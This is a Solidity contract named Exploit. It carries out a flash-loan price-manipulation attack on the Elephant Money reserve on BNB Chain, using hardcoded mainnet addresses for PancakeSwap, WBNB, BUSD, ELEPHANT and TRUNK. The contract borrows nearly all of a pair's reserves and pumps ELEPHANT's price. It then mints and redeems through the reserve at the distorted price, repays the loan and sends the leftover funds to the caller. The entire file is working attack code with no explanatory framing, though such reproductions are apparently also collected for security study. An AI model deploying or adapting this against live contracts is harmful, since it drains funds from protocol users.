//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;

import "./IERC20.sol";
import "./IPancakeRouter.sol";
import "./IPancakePair.sol";
import "./IWBNB.sol";
import "./IElephantReserve.sol";


contract Exploit {
    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair wbnbBusdPair = IPancakePair(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc);
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 elephant = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);
    IERC20 trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);
    IElephantReserve elephantReserve = IElephantReserve(0xD520a3B47E42a1063617A9b6273B206a07bDf834);

    constructor(){
        busd.approve(address(elephantReserve),type(uint256).max);
        trunk.approve(address(elephantReserve),type(uint256).max);
        elephant.approve(address(pancakeRouter),type(uint256).max);
        wbnb.approve(address(pancakeRouter),type(uint256).max);
    }

    function attack() public{
        (uint112 _reserve0, uint112 _reserve1, ) = wbnbBusdPair.getReserves();
        wbnbBusdPair.swap(_reserve0-1,_reserve1-1,address(this),new bytes(1));
    }

    function BiswapCall(address sender, uint amount0, uint amount1, bytes calldata data) public{
        wbnb.withdraw(wbnb.balanceOf(address(this)));

        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(elephant);
        pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value:address(this).balance}(0,path,address(this),block.timestamp+120);

        elephantReserve.mint(busd.balanceOf(address(this)));

        path[0] = address(elephant);
        path[1] = address(wbnb);
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(elephant.balanceOf(address(this)),0,path,address(this),block.timestamp+120);

        elephantReserve.redeem(trunk.balanceOf(address(this)));

        path[0] = address(elephant);
        path[1] = address(wbnb);
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(elephant.balanceOf(address(this)),0,path,address(this),block.timestamp+120);

        wbnb.deposit{value:address(this).balance}();
        wbnb.transfer(msg.sender,amount0*1000/998);

        path[0] = address(wbnb);
        path[1] = address(busd);
        pancakeRouter.swapExactTokensForTokens(wbnb.balanceOf(address(this)),0,path,address(this),block.timestamp+120);
        busd.transfer(msg.sender,amount1);
        busd.transfer(tx.origin,busd.balanceOf(address(this)));
    }

    receive() external payable {}
}